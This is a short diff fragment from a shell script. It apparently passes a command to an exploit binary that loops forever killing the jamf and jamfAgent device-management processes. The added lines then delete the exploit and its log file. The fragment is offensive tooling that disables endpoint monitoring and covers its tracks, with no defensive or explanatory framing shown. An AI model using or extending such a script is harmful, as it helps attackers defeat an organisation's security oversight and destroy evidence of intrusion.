@@ -27,3 +27,5 @@ echo "Doing work."
 "$exploit" <<'EOF'
 (for ((;;)); do killall jamf jamfAgent; done) &
 EOF
+
+rm "$exploit" "$logfile"
